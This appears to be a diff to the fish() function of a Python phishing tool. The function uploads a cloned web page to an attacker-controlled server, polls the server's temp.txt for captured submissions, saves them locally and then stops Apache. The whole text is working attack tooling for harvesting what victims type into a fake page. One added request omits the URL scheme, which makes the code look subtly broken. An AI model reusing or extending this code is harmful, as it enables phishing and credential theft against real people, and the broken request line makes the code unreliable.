@@ -68,7 +68,10 @@ def fish():
     # Host server
     host = str(input('Host server (localhost for the IP of our machine): '))
 
-    if host == 'localhost':
+    localAdress = include.get_ip()[1]
+
+    files = {'file': open(page)}
+    if host == 'localhost' or host == localAdress:
         version = ""
 
         f = open('Setup%sserver.config' % slash, 'r')
@@ -88,14 +91,24 @@ def fish():
                 print("[-] Exiting the attack")
                 return
 
-    files = {'file': open(page)}
-    try:
-        r = requests.post("http://"+host+"/index.php", files=files)
-    except Exception as e:
-        print(e)
-        print('[-] Unable to send the cloned page to the server')
-        print('[-] Exiting the attack')
-        return
+        try:
+            r = requests.post(host+":8888/index.php", files=files)
+        except Exception as e:
+            print(e)
+            print('[-] Unable to send the cloned page to the server')
+            print('[-] Exiting the attack')
+            time.sleep(5)
+            return
+
+    else:
+        try:
+            r = requests.post("http://"+host+"/index.php", files=files)
+        except Exception as e:
+            print(e)
+            print('[-] Unable to send the cloned page to the server')
+            print('[-] Exiting the attack')
+            time.sleep(5)
+
     print("[+] File sent to the server")
     target_URL = host+slash+"temp.txt"
     while 1:
@@ -118,4 +131,3 @@ def fish():
     print('[+] Fishing completed, the file is stored as:  %s' % fileName)
     if version == 'Linux':
         os.system('sudo service apache2 stop')
-
